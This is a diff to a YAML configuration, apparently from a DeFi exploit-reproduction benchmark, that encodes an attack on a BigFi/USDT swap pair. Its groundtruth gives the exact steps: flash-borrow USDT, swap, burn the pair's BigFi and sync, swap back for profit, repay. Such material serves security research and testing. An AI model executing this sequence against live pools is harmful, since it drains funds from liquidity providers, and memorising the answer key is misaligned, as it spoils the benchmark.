@@ -20,8 +20,9 @@ ctrt_name2deploy:
   - ["router", ""]
 
 extra_actions:
-  - "function burn_pair_bigfi(uint256 amount) internal {
+  - "function burn_bigfi_pair(uint256 amount) internal eurus {
     bigfi.burn(address(pair), amount);
+    pair.sync();
     }"
 
 extra_deployments: []
@@ -31,12 +32,11 @@ extra_statements: []
 attack_goal_str: "usdt"
 
 groundtruth:
-  - ["borrow", "owner", "usdt", "200000e18"]
-  - ["swap", "pair", "usdt", "bigfi", "usdt.balanceOf(attacker)"]
-  - ["burn", "pair", "bigfi", "3260e18"]
-  - ["sync", "pair"]
-  - ["swap", "pair", "bigfi", "usdt", "bigfi.balanceOf(attacker)"]
-  - ["payback", "owner", "usdt", "200600e18"]
+  - ["borrow", "usdt", "owner", "200000e18"]
+  - ["swap", "pair", "attacker", "usdt", "bigfi", "200000e18", "6049.946035638727192292e18"]
+  - ["burn", "bigfi", "pair", "3260e18"]
+  - ["swap", "pair", "attacker", "bigfi", "usdt", "6049.946035638727192292e18", "307427.442385714227894965e18"]
+  - ["payback", "usdt", "owner", "200600e18"]
 
 roles:
   "usdt":
@@ -50,7 +50,8 @@ roles:
     is_burnable: true
   "pair":
     is_swappair: true
-    uniswap_order: ["usdt", "bigfi"]
+    is_uniswap: true
+    token_pair: ["usdt", "bigfi"]
     support_swaps:
       "usdt": ["usdt", "bigfi"]
       "bigfi": ["usdt", "bigfi"]
